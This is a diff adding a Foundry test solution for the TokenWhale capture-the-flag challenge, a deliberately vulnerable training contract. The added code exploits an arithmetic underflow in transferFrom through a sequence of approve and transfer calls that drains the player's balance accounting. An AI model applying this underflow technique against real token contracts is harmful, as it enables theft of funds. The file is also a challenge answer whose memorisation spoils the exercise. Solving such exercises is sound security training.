@@ -22,7 +22,23 @@ contract TokenWhaleTest is Test {
     // Use the instance tokenWhale and exploitContract
     // Use vm.startPrank and vm.stopPrank to change between msg.sender
     function testExploit() public {
-        // Put your solution here
+        tokenWhale.approve(Alice, 1000);
+        tokenWhale.transfer(Alice, 501);
+        // Alice has 501 tokens
+        console.log(tokenWhale.balanceOf(Alice));
+        // player address  = address(this) has 499 tokens
+        console.log(tokenWhale.balanceOf(address(this)));
+
+        // Approval 
+        vm.prank(Alice);
+        tokenWhale.approve(address(this), 1000);
+        // Overflowing the player's address (499 < 501)
+        // request of 501 tokens transfer 
+        vm.prank(address(this));
+        tokenWhale.transferFrom(Alice, Alice, 501);
+        // Alice has 1002 tokens
+        console.log(tokenWhale.balanceOf(Alice));
+        console.log(tokenWhale.balanceOf(address(this)));
 
         _checkSolved();
     }
